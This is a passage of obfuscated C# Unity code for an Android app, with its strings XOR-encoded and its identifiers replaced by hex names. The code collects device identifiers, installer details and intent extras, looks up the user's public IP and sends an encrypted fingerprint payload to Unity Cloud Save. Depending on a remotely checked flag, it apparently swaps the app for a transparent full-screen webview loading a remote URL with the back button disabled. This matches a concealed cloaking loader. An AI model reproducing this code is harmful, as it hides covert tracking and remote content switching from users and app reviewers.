            using (var _0x93d2efcc = _0xd55ffcd4.GetStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 138, 156, 155, 155, 140, 135, 157, 168, 138, 157, 128, 159, 128, 157, 144 }, 233)))
            using (var _0x36d58b5d = _0x93d2efcc.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[17] { 179, 177, 160, 132, 181, 183, 191, 181, 179, 177, 153, 181, 186, 181, 179, 177, 166 }, 212)))
            using (var _0xb2b1b7d8 = _0x36d58b5d.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[25] { 221, 223, 206, 246, 219, 207, 212, 217, 210, 243, 212, 206, 223, 212, 206, 252, 213, 200, 234, 219, 217, 209, 219, 221, 223 }, 186), _0xf83b4e0f))
            {
                if (_0xb2b1b7d8 == null)
                    return false;
                WLog(_0x6bb1939a._0x92fa81ce(new byte[37] { 46, 5, 31, 2, 0, 8, 33, 4, 6, 8, 77, 1, 12, 24, 3, 14, 5, 77, 4, 3, 30, 25, 12, 1, 1, 8, 9, 77, 29, 12, 14, 6, 12, 10, 8, 87, 77 }, 109) + _0xf83b4e0f);
                _0xb2b1b7d8.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[8] { 126, 123, 123, 89, 115, 126, 120, 108 }, 31), 0x10000000);
                _0x93d2efcc.Call(_0x6bb1939a._0x92fa81ce(new byte[13] { 6, 1, 20, 7, 1, 52, 22, 1, 28, 3, 28, 1, 12 }, 117), _0xb2b1b7d8);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    internal bool isApplicationFocus = false;
    private string _0xe20276db()
    {
        string _0x9f922a51 = _0x6bb1939a._0x92fa81ce(new byte[62] { 144, 147, 146, 149, 148, 151, 150, 153, 152, 155, 154, 157, 156, 159, 158, 129, 128, 131, 130, 133, 132, 135, 134, 137, 136, 139, 176, 179, 178, 181, 180, 183, 182, 185, 184, 187, 186, 189, 188, 191, 190, 161, 160, 163, 162, 165, 164, 167, 166, 169, 168, 171, 193, 192, 195, 194, 197, 196, 199, 198, 201, 200 }, 241);
        System.Random _0xd7e59c90 = new System.Random();
        int _0x2bd410e0 = _0xd7e59c90.Next(8, 16);
        return new string (Enumerable.Repeat(_0x9f922a51, _0x2bd410e0).Select(_0x18d7d8ae => _0x18d7d8ae[_0xd7e59c90.Next(_0x18d7d8ae.Length)]).ToArray());
    }

    private string _0x0b59b7b6 = "";
    private AndroidJavaObject _0xe89ea475 { get; set; }

    private bool TryOpenExternalLikeChrome(string _0x9aadc9ed)
    {
        if (string.IsNullOrEmpty(_0x9aadc9ed))
            return false;
        if (_0x9aadc9ed.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[9] { 88, 95, 69, 84, 95, 69, 11, 30, 30 }, 49), StringComparison.OrdinalIgnoreCase))
            return _0x5ac9cae2(_0x9aadc9ed);
        if (_0x83ff5890(_0x9aadc9ed))
            return _0x05e5bc35(_0x9aadc9ed, null);
        if (!_0x9aadc9ed.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[7] { 122, 102, 102, 98, 40, 61, 61 }, 18), StringComparison.OrdinalIgnoreCase) && !_0x9aadc9ed.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[8] { 232, 244, 244, 240, 243, 186, 175, 175 }, 128), StringComparison.OrdinalIgnoreCase) && !_0x9aadc9ed.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[11] { 234, 233, 228, 254, 255, 177, 233, 231, 234, 229, 224 }, 139), StringComparison.OrdinalIgnoreCase))
        {
            return _0x67a8d970(_0x9aadc9ed);
        }

        return false;
    }

    private async Task _0xdb8e0176(string _0xd9bb1c33)
    {
        if (_0x6724a1dc || string.IsNullOrEmpty(_0xe2469192) || string.IsNullOrEmpty(_0xd9bb1c33) || _0x25c0631c)
            return;
        _0x6724a1dc = true;
        try
        {
            JObject _0x8857fe50 = BuildRandomPayload(_0xd9bb1c33, _0xe2469192, _0x64e8d81b());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xd9bb1c33} payload: {_0x8857fe50}");
                }
#endif
            }

            var _0x97115ff2 = _0x02d290b9(_0x8857fe50.ToString(), _0xe2469192);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x6bb1939a._0x92fa81ce(new byte[4] { 72, 75, 69, 64 }, 36) + _0xe2469192, _0x97115ff2 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[24] { 87, 88, 73, 95, 88, 81, 44, 64, 99, 109, 104, 44, 124, 109, 127, 127, 44, 105, 126, 126, 99, 126, 54, 44 }, 12) + e.Message);
#endif
            }
        }
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0xecaec59e()
    {
        var _0xb1aa3142 = _0x6bb1939a._0x92fa81ce(new byte[40] { 79, 83, 83, 87, 84, 29, 8, 8, 80, 80, 80, 9, 68, 75, 72, 82, 67, 65, 75, 70, 85, 66, 9, 68, 72, 74, 8, 68, 67, 73, 10, 68, 64, 78, 8, 83, 85, 70, 68, 66 }, 39);
        using (UnityWebRequest _0x39e9ee17 = UnityWebRequest.Get(_0xb1aa3142))
        {
            await _0x39e9ee17.SendWebRequest();
            string[] _0x1e8d5a73 = _0x39e9ee17.downloadHandler.text.Split('\n');
            foreach (string _0x6e389f0a in _0x1e8d5a73)
            {
                if (_0x6e389f0a.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[3] { 222, 199, 138 }, 183)))
                {
                    string _0x16f4abe0 = _0x6e389f0a.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0x16f4abe0} from {_0xb1aa3142}");
                        }
#endif
                    }

                    return _0x16f4abe0;
                }
            }
        }

        return "";
    }

    private IEnumerator _0x3e207760(IEnumerator _0xa1651a65, TaskCompletionSource<bool> _0xa2e642e6)
    {
        yield return _0xa1651a65;
        _0xa2e642e6.SetResult(true);
    }

    private async Task<bool> _0xa9ed8c00()
    {
        {
#if B_LOGS
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[29] { 108, 99, 82, 68, 67, 106, 23, 126, 68, 103, 69, 94, 65, 86, 84, 78, 118, 89, 83, 100, 86, 65, 82, 83, 116, 95, 82, 84, 92 }, 55));
#endif
        }

        string _0xd7d6d8bc = "";
        for (int _0x5a73eb89 = 0; _0x5a73eb89 < 2; _0x5a73eb89++)
        {
            if (await _0xff0f4872(1, 100))
            {
                await _0xdb8e0176(_0x6bb1939a._0x92fa81ce(new byte[7] { 255, 241, 242, 254, 246, 248, 249 }, 157));
                _0xf2040507();
                return true;
            }

            _0xd7d6d8bc = await _0x907c9f11(1, 100);
            if (!string.IsNullOrEmpty(_0xd7d6d8bc))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0xd7d6d8bc))
            {
                if (!string.IsNullOrEmpty(_0xd3338b8b))
                {
                    _0xd7d6d8bc = _0xbf05bd49(_0xd7d6d8bc, _0xd3338b8b);
                    {
#if B_LOGS
                        Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[53] { 140, 131, 178, 164, 163, 138, 247, 148, 182, 180, 191, 178, 179, 247, 177, 190, 185, 182, 187, 130, 165, 187, 247, 160, 190, 163, 191, 247, 164, 178, 185, 179, 190, 179, 247, 53, 81, 69, 247, 164, 191, 184, 160, 247, 128, 178, 181, 129, 190, 178, 160, 237, 247 }, 215) + _0xd7d6d8bc);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[39] { 252, 243, 194, 212, 211, 250, 135, 228, 198, 196, 207, 194, 195, 135, 193, 206, 201, 198, 203, 242, 213, 203, 135, 69, 33, 53, 135, 212, 207, 200, 208, 135, 240, 194, 197, 241, 206, 194, 208 }, 167));
#endif
                    }
                }

                _0x25c0631c = true;
                _0x07866a0f(_0xd7d6d8bc);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[44] { 23, 24, 41, 63, 56, 17, 108, 9, 52, 47, 41, 60, 56, 37, 35, 34, 108, 59, 36, 37, 32, 41, 108, 47, 36, 41, 47, 39, 37, 34, 43, 108, 63, 45, 58, 41, 40, 108, 32, 37, 34, 39, 118, 108 }, 76) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private IEnumerator _0x279bea12(string _0x2ef9b868)
    {
        if (_0x5ddc0b99 != null && _0xa32ed23d)
            yield break;
        _0x5ddc0b99 = gameObject.AddComponent<UniWebView>();
        _0xf859293a(_0x5ddc0b99);
        _0xae8cbb13(_0x5ddc0b99);
        _0x5ddc0b99.BackgroundColor = Color.clear;
        var _0x04a10b88 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xcea5638c();
        yield return new WaitForEndOfFrame();
        _0xa32ed23d = true;
        _0xffd250db();
        _0x32477d12(true);
        _0xba90566a = false;
        _0x82d22cf4 = false;
        _0x8651a4d4.Clear();
        _0x0da4a74b = -1;
        firstLoadShown = false;
        _0x119d7677 = false;
        _0xebb0e042 = false;
        _0x5ddc0b99.SetUserAgent("");
        _0xcd3046c7 = Time.realtimeSinceStartup;
        _0x5ddc0b99.Stop();
        _0x5ddc0b99.Load(_0x2ef9b868);
        _0x5ddc0b99.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x6bb1939a._0x92fa81ce(new byte[25] { 51, 31, 23, 16, 94, 41, 27, 28, 40, 23, 27, 9, 94, 55, 16, 23, 10, 23, 31, 18, 94, 45, 22, 17, 9 }, 126));
    }

    private async Task<bool> _0xc5f22eb9()
    {
        {
#if B_LOGS
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[37] { 229, 234, 219, 205, 202, 227, 158, 237, 215, 217, 208, 247, 208, 235, 208, 215, 202, 199, 237, 219, 204, 200, 215, 221, 219, 205, 255, 208, 209, 208, 199, 211, 209, 203, 205, 210, 199 }, 190));
#endif
        }

        try
        {
            var _0xbec254da = new InitializationOptions();
            await UnityServices.InitializeAsync(_0xbec254da);
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[32] { 236, 227, 210, 196, 195, 234, 151, 226, 217, 222, 195, 206, 228, 210, 197, 193, 222, 212, 210, 196, 151, 254, 217, 222, 195, 222, 214, 219, 222, 205, 210, 211 }, 183));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[20] { 211, 194, 212, 211, 167, 210, 233, 238, 243, 254, 212, 226, 245, 241, 238, 228, 226, 244, 189, 167 }, 135) + ex.Message);
#endif
            }

            _0x38a77c79?._0xf2040507();
            return true;
        }

        bool _0xef2ee2d5 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0xef2ee2d5 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[37] { 22, 25, 40, 62, 57, 16, 109, 30, 36, 42, 35, 96, 36, 35, 109, 12, 35, 34, 35, 52, 32, 34, 56, 62, 99, 109, 29, 33, 44, 52, 40, 63, 109, 4, 9, 119, 109 }, 77) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0xe2469192 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[25] { 45, 60, 42, 45, 89, 42, 16, 30, 23, 84, 16, 23, 89, 56, 12, 13, 17, 89, 60, 43, 43, 54, 43, 67, 89 }, 121) + ex.Message);
#endif
                }

                _0x38a77c79?._0xf2040507();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[28] { 176, 161, 183, 176, 196, 183, 141, 131, 138, 201, 141, 138, 196, 182, 129, 149, 145, 129, 151, 144, 196, 161, 182, 182, 171, 182, 222, 196 }, 228) + ex.Message);
#endif
                }

                _0x38a77c79?._0xf2040507();
                return true;
            }
        }
        while (!_0xef2ee2d5);
        return false;
    }

    private async Task<string> _0x907c9f11(int _0x6839020f = 5, int _0xf4a47433 = 500)
    {
        try
        {
            List<EntityData> _0xd87a4273 = new List<EntityData>();
            int _0x5c4e99fc = 0;
            do
            {
                _0xd87a4273 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x6bb1939a._0x92fa81ce(new byte[8] { 68, 88, 85, 77, 81, 70, 125, 80 }, 52), _0xe2469192, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0xe2469192 }), new QueryOptions())).ToList();
                await Task.Delay(_0xf4a47433);
            }
            while (_0xd87a4273.Count == 0 && _0x5c4e99fc++ < _0x6839020f);
            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[33] { 100, 107, 90, 76, 75, 98, 31, 108, 94, 73, 90, 91, 31, 115, 86, 81, 84, 31, 110, 74, 90, 77, 70, 31, 77, 90, 76, 74, 83, 75, 76, 5, 31 }, 63) + JsonConvert.SerializeObject(_0xd87a4273, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[39] { 152, 151, 166, 176, 183, 158, 227, 144, 162, 181, 166, 167, 227, 143, 170, 173, 168, 227, 146, 182, 166, 177, 186, 227, 177, 166, 176, 182, 175, 183, 176, 227, 160, 172, 182, 173, 183, 249, 227 }, 195) + _0xd87a4273.Count);
                }
#endif
            }

            var _0xfaf52be6 = _0xd87a4273.SelectMany(_0xcad656ad => _0xcad656ad.Data).FirstOrDefault(_0x6e8a206d => _0x6e8a206d.Key == _0xe2469192)?.Value.GetAs<string>() ?? string.Empty;
            _0xfaf52be6 = Decrypt(_0xfaf52be6, _0xe2469192);
            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[24] { 249, 246, 199, 209, 214, 255, 130, 238, 205, 195, 198, 130, 209, 195, 212, 199, 198, 130, 206, 203, 204, 201, 152, 130 }, 162) + _0xfaf52be6);
                }
#endif
            }

            return _0xfaf52be6;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[39] { 209, 222, 239, 249, 254, 215, 170, 205, 239, 254, 170, 229, 248, 170, 250, 235, 248, 249, 239, 170, 249, 235, 252, 239, 238, 170, 230, 227, 228, 225, 170, 236, 235, 227, 230, 239, 238, 176, 170 }, 138) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private int _0x9beb399f = 5, _0x8a414432 = 5, _0xbb651133 = 5, _0xb2b5c6cb = 5;
    private Action _0x44830441;
    internal bool ContainsIgnoreCase(string _0x412eed60, string _0x733bbff2)
    {
        if (string.IsNullOrEmpty(_0x412eed60) || string.IsNullOrEmpty(_0x733bbff2))
            return false;
        return _0x412eed60.IndexOf(_0x733bbff2, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0xf2040507();
    }

    private void _0xf859293a(UniWebView _0x5ade844a)
    {
        _0x5ade844a.BackgroundColor = Color.clear;
        _0x5ade844a.SetSupportMultipleWindows(true, true);
        _0x5ade844a.SetBackButtonEnabled(false);
        _0x5ddc0b99.SetUserAgent(_0x32227e8a());
    }

    internal bool IsAboutBlank(string _0x5769ee3a)
    {
        if (string.IsNullOrEmpty(_0x5769ee3a))
            return false;
        return _0x5769ee3a.StartsWith(_0x6bb1939a._0x92fa81ce(new byte[11] { 114, 113, 124, 102, 103, 41, 113, 127, 114, 125, 120 }, 19), StringComparison.OrdinalIgnoreCase);
    }

    private async Task<bool> _0xff0f4872(int _0x509f1cf4 = 5, int _0x4c2754ac = 500)
    {
        List<EntityData> _0x64fa1f50 = new List<EntityData>();
        int _0x0cacfd0b = 0;
        do
        {
            try
            {
                _0x64fa1f50 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x6bb1939a._0x92fa81ce(new byte[8] { 30, 2, 15, 23, 11, 28, 39, 10 }, 110), _0xe2469192, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x6bb1939a._0x92fa81ce(new byte[9] { 94, 68, 103, 69, 94, 65, 86, 84, 78 }, 55) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[32] { 29, 18, 35, 53, 50, 27, 102, 55, 51, 35, 52, 63, 7, 53, 63, 40, 37, 20, 35, 53, 51, 42, 50, 53, 102, 35, 52, 52, 41, 52, 124, 102 }, 70) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x4c2754ac);
        }
        while (_0x64fa1f50.Count == 0 && _0x0cacfd0b++ < _0x509f1cf4);
        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[32] { 225, 238, 223, 201, 206, 231, 154, 243, 201, 234, 200, 211, 204, 219, 217, 195, 154, 235, 207, 223, 200, 195, 154, 200, 223, 201, 207, 214, 206, 201, 128, 154 }, 186) + JsonConvert.SerializeObject(_0x64fa1f50, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[38] { 130, 141, 188, 170, 173, 132, 249, 144, 170, 137, 171, 176, 175, 184, 186, 160, 249, 136, 172, 188, 171, 160, 249, 171, 188, 170, 172, 181, 173, 170, 249, 186, 182, 172, 183, 173, 227, 249 }, 217) + _0x64fa1f50.Count);
            }
#endif
        }

        bool _0x8361ee57 = true;
        if (_0x64fa1f50.Count == 0)
        {
            _0x8361ee57 = false;
        }
        else
        {
            _0x8361ee57 = _0x64fa1f50.Any(_0xcad656ad => _0xcad656ad.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[25] { 175, 160, 145, 135, 128, 169, 212, 189, 135, 164, 134, 157, 130, 149, 151, 141, 212, 134, 145, 135, 129, 152, 128, 206, 212 }, 244) + _0x8361ee57);
            }
#endif
        }

        return _0x8361ee57;
    }

    private void _0xced42c31()
    {
        using (var _0xe3c52d19 = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[30] { 18, 30, 28, 95, 4, 31, 24, 5, 8, 66, 21, 95, 1, 29, 16, 8, 20, 3, 95, 36, 31, 24, 5, 8, 33, 29, 16, 8, 20, 3 }, 113)))
        using (var _0x76133b4f = _0xe3c52d19.GetStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 139, 157, 154, 154, 141, 134, 156, 169, 139, 156, 129, 158, 129, 156, 145 }, 232)))
        using (var _0x23ae0c03 = _0x76133b4f.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[9] { 235, 233, 248, 197, 226, 248, 233, 226, 248 }, 140)))
        {
            if (_0x23ae0c03 == null)
                return;
            using (var _0x7a7bc5ac = _0x23ae0c03.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[9] { 252, 254, 239, 222, 227, 239, 233, 250, 232 }, 155)))
            {
                if (_0x7a7bc5ac == null)
                    return;
                using (var _0xa122cde8 = new AndroidJavaObject(_0x6bb1939a._0x92fa81ce(new byte[19] { 78, 83, 70, 15, 75, 82, 78, 79, 15, 107, 114, 110, 111, 110, 67, 75, 68, 66, 85 }, 33)))
                using (var _0xe623122a = _0x7a7bc5ac.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[6] { 130, 140, 144, 186, 140, 157 }, 233)))
                using (var _0x39b8b0ba = _0xe623122a.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[8] { 32, 61, 44, 59, 40, 61, 38, 59 }, 73)))
                {
                    while (_0x39b8b0ba.Call<bool>(_0x6bb1939a._0x92fa81ce(new byte[7] { 28, 21, 7, 58, 17, 12, 0 }, 116)))
                    {
                        string _0xc2821f7c = _0x39b8b0ba.Call<string>(_0x6bb1939a._0x92fa81ce(new byte[4] { 245, 254, 227, 239 }, 155));
                        using (var _0x5f2c3bce = _0x7a7bc5ac.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[3] { 112, 114, 99 }, 23), _0xc2821f7c))
                        {
                            _0xa122cde8.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[3] { 23, 18, 19 }, 103), _0xc2821f7c, _0x5f2c3bce);
                        }
                    }

                    string _0xfc9337cd = _0xa122cde8.Call<string>(_0x6bb1939a._0x92fa81ce(new byte[8] { 198, 221, 225, 198, 192, 219, 220, 213 }, 178));
                    if (!string.IsNullOrEmpty(_0xfc9337cd))
                    {
                        _0x951460d9(_0xfc9337cd);
                        _0xd3cd2c28(_0xfc9337cd);
                    }
                }
            }
        }
    }

    private RectTransform _0x9997d60b;
    private string _0xcfc4feaf = "";
    private void StopCurrentFailedLoad(UniWebView _0x0ca32082)
    {
        _0x32477d12(false);
        if (_0x0ca32082 == null)
            return;
        _0x0ca32082.Stop();
        if (_0x0ca32082.CanGoBack)
            _0x0ca32082.GoBack();
    }

    private void _0x05b994f8()
    {
        if (_0xebb0e042)
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[18] { 27, 38, 55, 42, 126, 63, 50, 44, 59, 63, 58, 39, 126, 45, 54, 49, 41, 48 }, 94));
            return;
        }

        _0x32477d12(false);
        WLog(_0x6bb1939a._0x92fa81ce(new byte[46] { 210, 254, 246, 241, 191, 200, 250, 253, 201, 246, 250, 232, 191, 207, 234, 236, 247, 191, 209, 240, 235, 246, 249, 246, 252, 254, 235, 246, 240, 241, 191, 183, 247, 254, 237, 251, 232, 254, 237, 250, 191, 253, 254, 252, 244, 182 }, 159));
        ++_0x56bfde11;
        _0x3746b932();
        if (_0x56bfde11 <= 1)
            return;
        if (_0xdea5211c())
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[37] { 244, 201, 216, 197, 145, 194, 218, 216, 193, 193, 212, 213, 145, 156, 143, 145, 193, 222, 193, 196, 193, 194, 145, 194, 197, 216, 221, 221, 145, 222, 193, 212, 223, 212, 213, 139, 145 }, 177) + _0x8651a4d4.Count);
            return;
        }

        Application.Quit();
    }

    private void _0x272c3ba4()
    {
        {
#if B_LOGS
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[22] { 111, 96, 81, 71, 64, 105, 20, 103, 64, 91, 70, 81, 112, 81, 66, 93, 87, 81, 125, 90, 82, 91 }, 52));
#endif
        }

        _0x700d5500 = SystemInfo.deviceModel;
        _0x27213d69 = Application.version;
        _0x6836455b = Application.installMode;
        _0xa3df0380 = Application.installerName;
        _0xce136746 = Application.identifier;
        _0x37076cd9 = _0xd12fd142();
        _0x0b59b7b6 = _0x4d03db03();
        _0xcfc4feaf = SystemInfo.deviceUniqueIdentifier;
        _0xbf0d9e0b = SystemInfo.graphicsDeviceName;
        _0xc9658e78 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x27213d69 = _0x6bb1939a._0x92fa81ce(new byte[5] { 28, 5, 28, 5, 28 }, 43);
                _0x6836455b = ApplicationInstallMode.Store;
                _0xa3df0380 = _0x6bb1939a._0x92fa81ce(new byte[19] { 126, 114, 112, 51, 124, 115, 121, 111, 114, 116, 121, 51, 107, 120, 115, 121, 116, 115, 122 }, 29);
                _0x0b59b7b6 = _0x6bb1939a._0x92fa81ce(new byte[8] { 81, 89, 68, 64, 77, 20, 65, 85 }, 52);
                _0xcfc4feaf = Guid.NewGuid().ToString().Replace(_0x6bb1939a._0x92fa81ce(new byte[1] { 12 }, 33), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[17] { 254, 241, 192, 214, 209, 248, 133, 193, 192, 211, 232, 202, 193, 192, 201, 159, 133 }, 165) + _0x700d5500);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[19] { 203, 196, 245, 227, 228, 205, 176, 241, 224, 224, 198, 245, 226, 227, 249, 255, 254, 170, 176 }, 144) + _0x27213d69);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[20] { 230, 233, 216, 206, 201, 224, 157, 212, 211, 206, 201, 220, 209, 209, 240, 210, 217, 216, 135, 157 }, 189) + _0x6836455b);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[23] { 170, 165, 148, 130, 133, 172, 209, 152, 159, 130, 133, 144, 157, 157, 148, 131, 162, 133, 158, 131, 148, 203, 209 }, 241) + _0xa3df0380);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[14] { 21, 26, 43, 61, 58, 19, 110, 47, 62, 62, 7, 42, 116, 110 }, 78) + _0xce136746);
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[14] { 134, 137, 184, 174, 169, 128, 253, 188, 185, 171, 148, 185, 231, 253 }, 221) + _0x37076cd9);
